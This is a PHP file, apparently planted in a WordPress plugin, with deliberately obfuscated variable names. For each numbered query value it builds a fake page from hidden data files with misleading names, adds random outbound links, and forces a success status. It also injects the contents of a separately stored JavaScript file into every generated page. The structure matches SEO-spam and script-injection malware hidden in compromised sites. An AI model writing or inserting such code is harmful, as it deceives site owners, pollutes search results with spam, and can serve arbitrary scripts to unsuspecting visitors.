<?php
$k42O72 = intval(get_query_var('oatkzom'));

if ($k42O72 < 1 || $k42O72 > 5174) return;
$jzljjmc = file(plugin_dir_path(__FILE__).'changer-error.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$oJ1eQMDZO = explode(';', $jzljjmc[$k42O72]);
if (count($oJ1eQMDZO) < 2) return;
$eVRfn = $oJ1eQMDZO[0];
$mfEcFa3k  = $oJ1eQMDZO[1];
$oOZ1fN = $oJ1eQMDZO[2];
$kY0xDy  = $oJ1eQMDZO[3];
$m37smGl = $oJ1eQMDZO[4];
set_query_var('ezaqksl', $eVRfn);

$c7z1PsDQPE = '';
$fNIWk = plugin_dir_path(__FILE__).'excerpt-follow.php';
if (is_file($fNIWk)) {
	$kjkTYiS = file($fNIWk, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($kjkTYiS);
	shuffle($kjkTYiS);
	$kuOvDD = mt_rand(2, 5);
	if (count($kjkTYiS) > $kuOvDD) {
		for ($iFTPRjBW7 = 0; $iFTPRjBW7 < $kuOvDD; $iFTPRjBW7++) {
			$nDSCF = array_shift($kjkTYiS);
			$c7z1PsDQPE .= '<p><a href="'.$nDSCF.'">'.$nDSCF.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $eVRfn; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $mfEcFa3k . "</p>\n";
				if (strlen($kY0xDy) > 0) echo "<p>" . $kY0xDy . "</p>\n";
				if (strlen($oOZ1fN) > 0) echo "<p>" . $oOZ1fN . "</p>\n";
				if (strlen($m37smGl) > 0) echo '<p><a href="#"><img src="'.$m37smGl.'"></a>' . "</p>\n";
				echo $c7z1PsDQPE;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$vx4Ssb = plugin_dir_path(__FILE__) . 'navigation-copyright.js';
if (is_file($vx4Ssb)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($vx4Ssb);
	echo '</script>';
}
get_footer();
?>
